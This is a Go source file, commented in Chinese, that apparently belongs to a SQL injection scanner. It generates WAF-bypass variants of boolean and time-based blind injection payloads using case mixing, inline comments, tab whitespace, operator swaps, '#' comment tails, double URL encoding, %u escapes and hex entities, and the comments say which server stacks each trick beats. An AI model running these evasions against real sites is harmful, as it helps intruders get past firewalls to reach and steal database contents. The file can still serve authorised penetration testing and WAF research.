package sqli

import (
	"net/url"
	"strings"
)

// 本文件负责「验证广度」中的 WAF / EDR 绕过维度。
//
// 硬约束：任何绕过变换都必须保持 SQL 语义等价。把 "AND 1=1" 改成语法错误
// 不是绕过，而是让差分门控直接失效——既拿不到结论，也会污染证据链。
// 因此这里只做等价改写：大小写、内联注释、等价空白、等价运算符、等价注释终止，
// 以及依赖后端多做一层解码的编码类绕过（双重 URL、%uXXXX、十六进制字符实体）。

// evasion 是一种绕过风格。
type evasion struct {
	name string
	// apply 接收完整 payload 与其方言，返回等价改写后的 payload。
	apply func(payload, dialect string) string
}

// evasions 按「对语义影响从小到大」排序。
//
// 顺序即成本：前面的先试，命中即止。没有哪个风格能通吃所有 WAF，
// 所以宁可逐个试也不叠加——叠加容易把语义改坏，且命中后说不清是哪一步绕过的。
// 前五种是「语义等价改写」，改动后 SQL 本身依然成立，最先试；后三种是「编码类
// 绕过」，依赖目标链路对编码的解码层数，只有前五种都失败后才值得付出流量。
var evasions = []evasion{
	{name: "大小写混淆", apply: evadeCase},
	{name: "内联注释", apply: evadeInlineComment},
	{name: "空白替换", apply: evadeWhitespace},
	{name: "逻辑运算符", apply: evadeLogicalOperator},
	{name: "注释终止", apply: evadeCommentTail},
	{name: "双重 URL 编码", apply: evadeDoubleURL},
	{name: "Unicode 编码", apply: evadeUnicode},
	{name: "十六进制实体", apply: evadeHexEntity},
}

// sqlKeywords 是 WAF 重点盯防、且可安全改写大小写的关键字。
var sqlKeywords = []string{
	"AND", "OR", "UNION", "SELECT", "SLEEP", "PG_SLEEP",
	"BENCHMARK", "WAITFOR", "DELAY", "DBMS_PIPE", "RECEIVE_MESSAGE",
}

// evadePair 对一条候选套用某一种绕过风格。
//
// 时间盲注的秒数模板也要一并改写：成比例验证会按加档秒数重新生成触发 payload，
// 若只改 trueValue 而留下未改写的模板，重新生成的加档 payload 就绕不过 WAF 了。
// 先改写模板再格式化，比先格式化再改写更干净——不会碰参数值里的同形子串。
func evadePair(p boolPair, e evasion) boolPair {
	out := boolPair{
		label:      p.label,
		dialect:    p.dialect,
		evasion:    e.name,
		trueValue:  e.apply(p.trueValue, p.dialect),
		falseValue: e.apply(p.falseValue, p.dialect),
		seconds:    p.seconds,
	}
	if p.timeTrueTmpl != "" {
		out.timeTrueTmpl = e.apply(p.timeTrueTmpl, p.dialect)
	}
	return out
}

// evasionBoolPairs 生成绕过用的布尔候选。
//
// 只对最主要的两个闭合上下文（数字型、单引号型）展开：绕过针对的是「WAF 过滤了
// 关键字」，与闭合上下文正交，对全部上下文展开会把候选数放大到数十条，得不偿失。
func evasionBoolPairs(orig string) []boolPair {
	base := boolPairsFor(contexts[:2], orig)
	out := make([]boolPair, 0, len(base)*len(evasions))
	for _, e := range evasions {
		for _, p := range base {
			out = append(out, evadePair(p, e))
		}
	}
	return out
}

// evasionTimePairs 生成时间盲注的绕过候选。
//
// 只对 MySQL 的延时 payload 套用前两种绕过风格：SLEEP 是 WAF 规则命中率最高的
// 关键字，而跨方言的延时函数本身已经足够小众，再叠加绕过收益很低。
func evasionTimePairs(orig string, seconds int) []boolPair {
	base := timePairsFor(timePayloads[:2], orig, seconds)
	out := make([]boolPair, 0, len(base)*2)
	for _, e := range evasions[:2] {
		for _, p := range base {
			out = append(out, evadePair(p, e))
		}
	}
	return out
}

// evadeCase 把所有 SQL 关键字改成交替大小写，规避只匹配固定大小写的规则。
func evadeCase(s, _ string) string {
	out := s
	for _, kw := range sqlKeywords {
		out = replaceKeyword(out, kw, alternateCase(kw))
	}
	return out
}

// alternateCase 生成 "SlEeP" 这类交替大小写形式。
func alternateCase(s string) string {
	b := []byte(strings.ToLower(s))
	for i := 0; i < len(b); i += 2 {
		if b[i] >= 'a' && b[i] <= 'z' {
			b[i] -= 'a' - 'A'
		}
	}
	return string(b)
}

// evadeInlineComment 用内联注释包裹关键字。
//
// 只包裹关键字本身、不动行尾注释：MySQL 要求 "--" 之后必须是空白字符，
// 一旦把尾注释也注释化，"--" 会被当成两个减号，真假语义直接反转。
// 注释在 SQL 中等价于空白，但会打断 WAF 对 " AND 1=1 " 这类连续文本的匹配。
func evadeInlineComment(s, _ string) string {
	out := s
	for _, kw := range []string{"AND", "OR", "UNION"} {
		out = replaceKeyword(out, kw, "/**/"+kw+"/**/")
	}
	return out
}

// evadeWhitespace 把关键字两侧的空白替换成制表符。
// WAF 常只对标准空格做归一化，对 %09 形式的等价空白会放行。
func evadeWhitespace(s, _ string) string {
	out := s
	for _, kw := range []string{"AND", "OR"} {
		out = replaceKeyword(out, kw, "\t"+kw+"\t")
	}
	return out
}

// evadeLogicalOperator 用等价运算符替换关键字：MySQL 中 "&&" 等价 AND、"||" 等价 OR。
//
// PostgreSQL 里 "&&" 是数组重叠运算符，强行替换会引入语法错误，因此只在兼容方言
// 上生效——绕过的前提是「结果仍然成立」，而不是「换个写法让它报错」。
func evadeLogicalOperator(s, dialect string) string {
	if dialect != "mysql" && dialect != "generic" {
		return s
	}
	return replaceKeyword(replaceKeyword(s, "AND", "&&"), "OR", "||")
}

// evadeCommentTail 换成另一种注释终止方式，规避对 "--" 的过滤。
// "#" 是 MySQL 专有语法，因此同样只在兼容方言上生效。
func evadeCommentTail(s, dialect string) string {
	if dialect != "mysql" && dialect != "generic" {
		return s
	}
	if !strings.HasSuffix(s, commentTail) {
		return s
	}
	return strings.TrimSuffix(s, commentTail) + "#"
}

// evadeDoubleURL 把整个 payload 再做一次 URL 编码。
//
// 适用于「WAF 只解码一层、后端却解码两层」的链路：WAF 看到的是 %2527 这类二次
// 编码，剥离一层后仍不是 "'"，规则不命中；而真正到达业务层的值会被再解一层，还原
// 成原始 SQL 片段。查询串 / 表单 / 路径段在报文层还会各自编码一次，正好构成这一层。
//
// 对不做二次解码的目标，这条候选只会因为「值没被还原」而差分不成立——是失败，
// 不是误报，因此可以安全地放在候选队列里。
func evadeDoubleURL(s, _ string) string {
	return url.QueryEscape(s)
}

// unicodeEscapes / hexEntityEscapes 是编码类绕过改写的字符集合。
//
// 只挑「SQL 语法里承担结构作用」的字符：引号负责闭合字符串、括号负责闭合函数调用、
// 空格负责分隔关键字。改动其它字符（如关键字本身）在编码层没有收益，反而会放大
// payload 体积。
var (
	unicodeEscapes = map[byte]string{
		'\'': "%u0027",
		'"':  "%u0022",
		' ':  "%u0020",
		'(':  "%u0028",
		')':  "%u0029",
	}
	hexEntityEscapes = map[byte]string{
		'\'': "&#x27;",
		'"':  "&#x22;",
		' ':  "&#x20;",
	}
)

// evadeUnicode 把关键字符换成 IIS / ASP.NET 系的 %uXXXX 宽字符写法。
//
// 该体系对 %u0027 的解码时机常与 WAF 不一致，从而造成两者视图错位。非该体系的
// 实现不解码 %uXXXX，只是让这条候选失效。
func evadeUnicode(s, _ string) string {
	return replaceCharEscapes(s, unicodeEscapes)
}

// evadeHexEntity 把关键字符换成十六进制字符实体（&#x27;）。
//
// XML / SOAP / HTML 上下文会把它解码回原字符，于是 SQL 语义不变，而基于文本匹配的
// WAF 看不到裸引号——正好补上 XML 注入点的绕过缺口。
func evadeHexEntity(s, _ string) string {
	return replaceCharEscapes(s, hexEntityEscapes)
}

// replaceCharEscapes 按单字节替换表改写 payload。
//
// 逐字节改写而非字符串替换，是为了不动参数值里的同形子串：只把「承担 SQL 结构作用」
// 的那几个字符编码掉，其余内容原样保留。
func replaceCharEscapes(s string, table map[byte]string) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		if repl, ok := table[s[i]]; ok {
			b.WriteString(repl)
			continue
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

// replaceKeyword 把 payload 中「独立出现」的 keyword（大小写不敏感）替换成 repl。
//
// 独立 = 前后都不是标识符字符，避免把参数值里的 "rand"、"order" 也一起改掉——
// 那是在改坏用户数据，而不是绕过 WAF。
//
// 匹配只做 ASCII 大小写折叠，绝不用 strings.ToLower 另建整串：非 ASCII 字符
// （如 "İ"）折小写后字节长度可能变化，会与原文索引错位，轻则改坏 payload，
// 重则切片越界 panic。SQL 关键字本身是纯 ASCII，无需处理这类字符。
func replaceKeyword(s, keyword, repl string) string {
	kl := len(keyword)
	if kl == 0 || len(s) < kl {
		return s
	}
	var b strings.Builder
	b.Grow(len(s) + len(repl))
	i := 0
	for i < len(s) {
		if i+kl <= len(s) && asciiEqualFold(s[i:i+kl], keyword) && isKeywordBoundary(s, i, kl) {
			b.WriteString(repl)
			i += kl
			continue
		}
		b.WriteByte(s[i])
		i++
	}
	return b.String()
}

// asciiEqualFold 比较等长字符串是否在 ASCII 范围内大小写相等。
func asciiEqualFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		if lowerASCII(a[i]) != lowerASCII(b[i]) {
			return false
		}
	}
	return true
}

func lowerASCII(c byte) byte {
	if c >= 'A' && c <= 'Z' {
		return c + 'a' - 'A'
	}
	return c
}

func isKeywordBoundary(s string, start, length int) bool {
	if start > 0 && isIdentChar(s[start-1]) {
		return false
	}
	if end := start + length; end < len(s) && isIdentChar(s[end]) {
		return false
	}
	return true
}

func isIdentChar(c byte) bool {
	return c == '_' ||
		(c >= '0' && c <= '9') ||
		(c >= 'a' && c <= 'z') ||
		(c >= 'A' && c <= 'Z')
}
